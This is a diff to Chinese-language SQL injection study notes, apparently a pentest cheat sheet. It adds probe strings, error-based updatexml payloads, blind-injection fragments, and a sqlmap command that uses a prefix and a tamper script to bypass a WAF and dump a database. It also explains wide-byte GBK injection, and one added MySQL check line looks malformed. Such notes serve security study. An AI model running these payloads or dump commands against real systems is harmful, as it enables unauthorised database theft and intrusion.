@@ -22,6 +22,10 @@ outline: deep
 ```sql
 # step1 报错
 '
+"
+)'
+\
+/0
 # step2 200
 ''
 ' --+
@@ -74,6 +78,14 @@ outline: deep
 | **Microsoft (SQL Server)** | `username+ '-' +password`             |
 | **PostgreSQL**             | `username \|\| '-' \|\|password`      |
 | **MySQL**                  | `CONCAT(username, '-', password)`     |
+
+**判断是mysql**
+
+```html
+/*!aa*/
+
+SELECT IF 520.e(1=1, 1, 0);
+```
 
 ## union注入
 
@@ -213,9 +225,10 @@ current user is DBA: True
 sqlmap -u "http://xxx?id=1" --current-user
 current user: 'root@localhost'
 ```
+
 ---
 
-<span style="font-size: 23px;">**sqlmap指定User-Agent**</span>
+<span style="font-size: 19px;">**sqlmap指定User-Agent**</span>
 
 通过指定User-Agent绕过服务器限制
 - `-A` **AGENT** 指定User-Agent
@@ -225,7 +238,7 @@ current user: 'root@localhost'
 ```bash
 sqlmap -u "http://xxx" --random-agent
 ```
-<span style="font-size: 23px;">**sqlmap加载cookie**</span>
+<span style="font-size: 19px;">**sqlmap加载cookie**</span>
 
 - 通过`--cookie`=COOKIE 选项加载**cookie**，可以用于需要身份验证情况下的注入。
 
@@ -236,7 +249,7 @@ sqlmap -u "http://xxx" --cookie="COOKIE"
 ```
 ---
 
-<span style="font-size: 23px;">**post型注入**</span>
+<span style="font-size: 19px;">**post型注入**</span>
 
 - 通过`--data`选项指定post方法传递的数据
 
@@ -250,13 +263,36 @@ sqlmap -r "post.txt" -p "id"
 ```
 ---
 
-<span style="font-size: 23px;">**通过sqlmap获取Shell**</span>
+<span style="font-size: 19px;">**通过sqlmap获取Shell**</span>
 
 - 需要知道网站的主目录，且有一个具有 **写** 权限的目录
 
 ```bash
 sqlmap -r "post.txt" --os-shell
 ```
+<span style="font-size: 19px;">**指定前缀**</span>
+
+*固定POST请求参数前缀*
+
+`url=http://172.172.0.59?username=admin'?usernmae=123321'-updatexml(1,concat(0x7e,user()),1)`
+
+```bash
+sqlmap -u "http://192.168.99.12/" --data "url=" --prefix "http://172.172.0.59?username=admin'" --dbms mysql -p url --tech E -v 3 --level 3 --tamper space2comment -D "user" --dump
+```
+| 参数 | 含义与作用 |
+| :--- | :--- |
+| `-u "http://192.168.99.12/"` | 指定目标请求的 URL 地址。 |
+| `--data "url="` | 指定以 **POST 方式**提交请求体数据，目标参数为 `url`。 |
+| `--prefix "http://172.172.0.59?username=admin'"` | **前缀闭合**：指定在注入 Payload 之前拼接的前缀字符串，包含单引号 `'` 用于闭合前文的 SQL 语句（常用于 SSRF/二次注入场景）。 |
+| `--dbms mysql` | 显式指定目标数据库类型为 **MySQL**，跳过自动检测提高效率。 |
+| `-p url` | 明确指定仅对 **`url`** 这个参数进行 SQL 注入测试。 |
+| `--tech E` | 限制注入技术类型为 **Error-based（报错注入）**（E 代表 Error-based，即利用上一问中 `UPDATEXML` 等报错提取数据）。 |
+| `-v 3` | 调试日志详细级别设为 3，会在终端实时输出完整发送的 HTTP 请求 payload 和响应数据包。 |
+| `--level 3` | 探测等级设为 3（提升测试 Payload 数量，同时会额外测试 HTTP Header 参数）。 |
+| `--tamper space2comment` | 使用 tamper 绕过脚本，将 Payload 中的**空格替换为 inline 注释符 `/**/`**，用于绕过 WAF/防火墙对空格的拦截。 |
+| `-D "user"` | 指定要进行数据脱取的数据库名称为 **`user`**。 |
+| `--dump` | 导出/拖出该数据库（`user`）中所有表的内容数据。 |
+
 ---
 
 ## Stacked
@@ -331,6 +367,7 @@ select extractvalue(1, concat(0x7e, (select @@version)));
 ```sql
 select updatexml(1,concat(0x7e,(SELECT @@version)),1);
 ```
+
 `1105 - XPATH syntax error: '~5.7.26'`
 
 *payload*
@@ -342,6 +379,11 @@ select updatexml(1,concat(0x7e,(SELECT @@version)),1);
   - `xml_target`：目标 **XML** 内容或文档。
   - `xpath_expression`：用于定位要修改的 **XML** 节点的 **XPath** 路径。
   - `new_xml`：替换后的新 **XML** 内容。
+
+```bash
+?usernmae=123321'-updatexml(1,concat(0x7e,user()),1)
+```
+- `-`：**运算符连接**：利用减号（或 `AND` / `OR`）连接前后表达式，强制数据库执行后面的函数。
 
 *特殊绕过*
 ```bash
@@ -441,6 +483,14 @@ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1
 ```
 ```bash
 '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+**其它可能有用**
+
+```html
+... and (1/length(user)-9)='1
+
+... and--%0alength(database())<3 --+
 ```
 
 ### Time-Based
@@ -688,7 +738,39 @@ http://127.0.0.1:80/sqli_2.php?movie=13 ununionion select 1,user(),user(),4,5,6,
 a=/*&id=注入语句&b=*/
 ```
 
-### 宽字节注入
+## 宽字节注入
+
+**宽字节注入（Wide-byte SQL Injection）** 是一种利用**数据库字符集编码特性**来绕过防护转义的 SQL 注入漏洞类型。
+
+它通常发生在 Web 应用与数据库使用 **多字节字符集（如 GBK、BIG5 等）** 且字符集设置不统一的场景中。
+
+**核心原理**
+
+为了防止 SQL 注入，Web 应用程序或防御函数（如 PHP 的 `addslashes()`）通常会对用户输入中的单引号 `'` 进行转义，在单引号前自动加上转义符反斜杠 `\`：
+* 单引号 `'` 的 ASCII 码是：`0x27`
+* 反斜杠 `\` 的 ASCII 码是：`0x5C`
+* 转义后的 `\'` 对应十六进制表示为：`0x5C 0x27`
+
+然而，在 **GBK** 等双字节编码中，一个汉字由两个字节组成：
+* 第一个字节（高位字节）的范围通常是 `0x81` ~ `0xFE`
+* 第二个字节（低位字节）的范围通常是 `0x40` ~ `0xFE`
+
+**“吃掉转义符”的过程：**
+1. 假设用户在输入中传入了高位字节字符 `0xdf`，后接单引号 `'`（`0x27`），即输入：`0xdf 0x27`。
+2. 应用程序防注入函数对单引号进行转义，插入反斜杠 `0x5C`，字符串变为：`0xdf 0x5C 0x27`。
+3. 当这个字符串送入使用 GBK 编码的数据库时，数据库的解析器会尝试将双字节合并为一个汉字。由于 `0xdf` 在高位字节范围内，且反斜杠 `0x5C` 刚好落在 GBK 第二个字节的范围内（`0x40` ~ `0xFE`）：
+   * 数据库会将 `0xdf 0x5C` 组合解析为一个合法的 GBK 汉字（例如：`蠛`）。
+   * 结果，反斜杠 `0x5C` 被“消耗/吞掉”了。
+4. 此时，原本紧随其后的单引号 `0x27` 失去了反斜杠的转义作用，成功逃逸出来闭合 SQL 语句，导致注入发生。
+
+**产生的根本原因**
+
+1. **编码上下文不一致**：
+   应用程序层面的转义函数（如 `addslashes()`）是基于单字节（ASCII/UTF-8）逻辑进行替换的，它无法感知数据库当前连接使用的是 GBK 等多字节字符集。
+2. **错误的字符集设置方式**：
+   在代码中直接使用 `SET NAMES gbk` 来设置数据库连接编码，而没有通过数据库客户端驱动 API 正确告知转义函数当前使用的字符集。
+
+**PoC**
 
 <span style="font-size: 19px;">**逃逸绕过转义函数（宽字节注入）**</span>
 
